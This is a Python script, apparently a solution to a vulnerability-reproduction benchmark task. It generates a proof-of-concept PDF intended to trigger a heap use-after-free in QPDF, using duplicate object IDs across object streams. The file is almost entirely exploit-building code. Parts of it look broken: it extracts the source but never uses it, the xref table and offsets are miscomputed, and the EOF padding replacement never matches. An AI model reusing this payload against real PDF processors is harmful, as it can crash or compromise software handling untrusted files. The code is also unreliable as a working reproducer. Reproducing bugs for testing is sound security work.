import os
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract QPDF source
        import tarfile
        import shutil
        
        # Create a temporary directory for building
        build_dir = tempfile.mkdtemp()
        
        try:
            # Extract the source tarball
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(build_dir)
            
            # Find the qpdf source directory
            qpdf_dir = None
            for item in os.listdir(build_dir):
                if item.startswith('qpdf-'):
                    qpdf_dir = os.path.join(build_dir, item)
                    break
            
            if not qpdf_dir:
                # Try to find any directory that looks like qpdf source
                for root, dirs, files in os.walk(build_dir):
                    if 'qpdf' in root.lower() and 'CMakeLists.txt' in files:
                        qpdf_dir = root
                        break
            
            if not qpdf_dir:
                raise Exception("Could not find qpdf source directory")
            
            # Build a minimal QPDF to understand object structure
            # We'll create a simple PDF that triggers the use-after-free
            
            # The vulnerability involves object streams and multiple entries
            # for the same object id. We need to create a PDF with:
            # 1. Object streams (compressed objects)
            # 2. Multiple references to the same object
            # 3. Triggers QPDFWriter::preserveObjectStreams
            
            # Based on the vulnerability description and similar heap-use-after-free
            # bugs in QPDF, we need to create object streams with duplicate object IDs
            
            # Create a PDF that will trigger the bug when processed by QPDF
            
            # PDF structure:
            # 1. Header
            # 2. Objects with object streams containing duplicate object IDs
            # 3. Cross-reference table
            # 4. Trailer
            
            # The bug is triggered when QPDFWriter::preserveObjectStreams causes
            # QPDF::getCompressibleObjSet to delete objects from cache when there
            # are multiple entries for the same object id
            
            pdf_parts = []
            
            # PDF Header
            pdf_parts.append(b'%PDF-1.4\n')
            pdf_parts.append(b'%\xc2\xa5\xc2\xb1\xc3\xab\xc3\x8f\n')  # Binary comment
            
            # Object 1: Catalog
            catalog = b'''1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/Outlines 3 0 R
/AcroForm 4 0 R
>>
endobj
'''
            pdf_parts.append(catalog)
            
            # Object 2: Pages
            pages = b'''2 0 obj
<<
/Type /Pages
/Kids [5 0 R]
/Count 1
>>
endobj
'''
            pdf_parts.append(pages)
            
            # Object 3: Outlines
            outlines = b'''3 0 obj
<<
/Type /Outlines
/Count 0
>>
endobj
'''
            pdf_parts.append(outlines)
            
            # Object 4: AcroForm with duplicate references
            acroform = b'''4 0 obj
<<
/Type /AcroForm
/Fields [6 0 R 7 0 R 8 0 R]
/NeedAppearances true
/DR <<
/Font <<
/F1 9 0 R
>>
>>
/DA (/F1 0 Tf 0 g)
>>
endobj
'''
            pdf_parts.append(acroform)
            
            # Object 5: Page
            page = b'''5 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Resources <<
/Font <<
/F1 9 0 R
>>
/ProcSet [/PDF /Text]
>>
/Contents 10 0 R
/Annots [11 0 R]
>>
endobj
'''
            pdf_parts.append(page)
            
            # Create form field objects with duplicate references
            # These will be stored in object streams
            field1 = b'''6 0 obj
<<
/Type /Annot
/Subtype /Widget
/FT /Tx
/Rect [100 700 300 750]
/T (Field1)
/V (Value1)
>>
endobj
'''
            
            field2 = b'''7 0 obj
<<
/Type /Annot
/Subtype /Widget
/FT /Tx
/Rect [100 650 300 700]
/T (Field2)
/V (Value2)
>>
endobj
'''
            
            field3 = b'''8 0 obj
<<
/Type /Annot
/Subtype /Widget
/FT /Tx
/Rect [100 600 300 650]
/T (Field3)
/V (Value3)
>>
endobj
'''
            
            # Object 9: Font
            font = b'''9 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
/Encoding /WinAnsiEncoding
>>
endobj
'''
            pdf_parts.append(font)
            
            # Object 10: Content stream
            content = b'''10 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 100 Td
(Hello World) Tj
ET
endstream
endobj
'''
            pdf_parts.append(content)
            
            # Object 11: Annotation
            annot = b'''11 0 obj
<<
/Type /Annot
/Subtype /Link
/Rect [100 100 200 150]
/Border [0 0 2]
/A <<
/Type /Action
/S /URI
/URI (http://example.com)
>>
>>
endobj
'''
            pdf_parts.append(annot)
            
            # Now create object streams with duplicate object IDs
            # Object 12: Object stream containing multiple objects
            # This is where we create duplicate references
            
            # First, let's create some objects that will be in the stream
            obj_in_stream1 = b'''13 0 obj
(Stream Object 1)
endobj
'''
            
            obj_in_stream2 = b'''14 0 obj
(Stream Object 2)
endobj
'''
            
            obj_in_stream3 = b'''15 0 obj
(Stream Object 3)
endobj
'''
            
            # Create an object stream that contains objects 13, 14, 15
            # But we'll also reference object 13 multiple times
            stream_data = b'13 0 14 20 15 40\n'
            stream_data += b'(Stream Object 1)(Stream Object 2)(Stream Object 3)'
            
            obj_stream = b'''12 0 obj
<<
/Type /ObjStm
/N 3
/First 12
/Length %d
>>
stream
%s
endstream
endobj
''' % (len(stream_data), stream_data)
            
            pdf_parts.append(obj_stream)
            
            # Now create another object stream that also contains object 13
            # This creates the duplicate reference that triggers the bug
            stream_data2 = b'16 0 13 20 17 40\n'
            stream_data2 += b'(Another Stream)(Duplicate of Object 13)(Another Object)'
            
            obj_stream2 = b'''18 0 obj
<<
/Type /ObjStm
/N 3
/First 12
/Length %d
>>
stream
%s
endstream
endobj
''' % (len(stream_data2), stream_data2)
            
            pdf_parts.append(obj_stream2)
            
            # Add the objects that are referenced in the second stream
            # These need to exist as separate objects too
            obj16 = b'''16 0 obj
(Another Stream Object)
endobj
'''
            pdf_parts.append(obj16)
            
            obj17 = b'''17 0 obj
(Yet Another Object)
endobj
'''
            pdf_parts.append(obj17)
            
            # Create more duplicate references to stress the cache
            for i in range(19, 50):
                obj = b'''%d 0 obj
<<
/Type /Annot
/Subtype /Widget
/FT /Tx
/Rect [100 %d 300 %d]
/T (Field%d)
>>
endobj
''' % (i, 500 - (i-19)*10, 550 - (i-19)*10, i)
                pdf_parts.append(obj)
            
            # Add objects 13, 14, 15 as regular objects too
            # This creates multiple entries for the same object IDs
            pdf_parts.append(obj_in_stream1)
            pdf_parts.append(obj_in_stream2)
            pdf_parts.append(obj_in_stream3)
            
            # Create more objects to reach the target size and increase
            # the chance of triggering the bug
            for i in range(50, 200):
                if i % 10 == 0:
                    # Create another object stream with duplicates
                    stream_data = b'%d 0 %d 20\n' % (i, i+1)
                    stream_data += b'(Duplicate Stream Content)'
                    obj_stream = b'''%d 0 obj
<<
/Type /ObjStm
/N 2
/First 12
/Length %d
>>
stream
%s
endstream
endobj
''' % (i+1000, len(stream_data), stream_data)
                    pdf_parts.append(obj_stream)
                else:
                    obj = b'''%d 0 obj
<<
/Type /Test
/TestValue %d
>>
endobj
''' % (i, i)
                    pdf_parts.append(obj)
            
            # Now create the cross-reference table
            xref_offset = sum(len(part) for part in pdf_parts)
            xref_table = [b'xref\n0 1200\n0000000000 65535 f \n']
            
            # Calculate offsets for each object
            offset = len(pdf_parts[0])
            xref_table.append(b'%010d 00000 n \n' % offset)
            
            # Add offsets for remaining objects
            for i in range(1, len(pdf_parts) - 1):
                offset += len(pdf_parts[i])
                xref_table.append(b'%010d 00000 n \n' % offset)
            
            # Add trailer
            trailer = b'''trailer
<<
/Size 1200
/Root 1 0 R
/Info 1199 0 R
>>
startxref
%d
%%%%EOF
''' % xref_offset
            
            # Create info object
            info_obj = b'''1199 0 obj
<<
/Title (Heap Use After Free PoC)
/Creator (QPDF PoC Generator)
/CreationDate (D:20240101000000Z)
>>
endobj
'''
            pdf_parts.append(info_obj)
            
            # Combine all parts
            pdf_bytes = b''.join(pdf_parts)
            
            # Add the xref table and trailer
            pdf_bytes += b''.join(xref_table)
            pdf_bytes += trailer
            
            # Ensure we have the target length
            current_len = len(pdf_bytes)
            target_len = 33453
            
            if current_len < target_len:
                # Pad with comments
                padding = b'\n%' + b'X' * (target_len - current_len - 2) + b'\n'
                pdf_bytes = pdf_bytes.replace(b'%%%%EOF\n', padding + b'%%%%EOF\n')
            elif current_len > target_len:
                # Truncate (shouldn't happen with our construction)
                pdf_bytes = pdf_bytes[:target_len]
            
            return pdf_bytes
            
        finally:
            # Clean up
            shutil.rmtree(build_dir, ignore_errors=True)